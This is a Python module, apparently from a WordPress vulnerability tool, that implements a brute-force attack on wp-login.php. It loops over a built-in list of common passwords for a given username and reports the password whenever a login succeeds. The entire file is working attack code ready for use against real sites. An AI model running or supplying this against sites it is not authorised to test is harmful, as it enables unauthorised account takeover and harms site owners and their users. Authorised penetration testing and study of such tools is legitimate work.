import time
from wp_vuln_tool.http_client import get_session, safe_post

COMMON_PASSWORDS = [
    "password", "password123", "admin123", "123456", "12345678",
    "letmein", "qwerty123", "welcome1", "admin@123", "changeme",
]


def bruteforce_login(target: str, username: str, passwords=None, delay: float = 1.0) -> dict:
    session = get_session()
    url = target.rstrip("/") + "/wp-login.php"
    passwords = passwords or COMMON_PASSWORDS
    attempts = []

    for pwd in passwords:
        response = safe_post(
            session,
            url,
            data={"log": username, "pwd": pwd, "wp-submit": "Log In"},
            allow_redirects=True,
        )

        if isinstance(response, dict) and "error" in response:
            attempts.append({"password": pwd, "result": "network_error", "detail": response["error"]})
            time.sleep(delay)
            continue

        success = (
            "wordpress_logged_in" in str(response.cookies.get_dict())
            or "/wp-admin/" in response.url
        )
        attempts.append({"password": pwd, "result": "success" if success else "failed"})

        if success:
            return {
                "technique": "bruteforce",
                "username": username,
                "success": True,
                "password_found": pwd,
                "attempts": attempts,
            }

        time.sleep(delay)

    return {
        "technique": "bruteforce",
        "username": username,
        "success": False,
        "password_found": None,
        "attempts": attempts,
    }